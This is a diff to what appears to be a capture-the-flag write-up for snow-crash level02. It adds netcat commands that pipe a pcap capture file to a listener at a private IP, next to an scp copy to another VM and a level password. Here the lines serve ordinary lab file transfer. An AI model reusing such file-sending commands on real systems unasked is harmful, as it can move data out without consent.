@@ -11,6 +11,13 @@ pass = f2av5il02puano7naaf6adaaf
 
 `chmod 777 level02.pcap`
 
+or via netcat:
+```
+nc 10.12.10.14 1234 < level02.pcap
+on host:
+nc -l 1234 > level02.pcap
+```
+
 resend it to a VM where Wireshark is installed
 ```
 scp $HOME/Desktop/snow-crash/level02/Resources/level02.pcap mohamed@10.12.100.190:/home/mohamed/Desktop
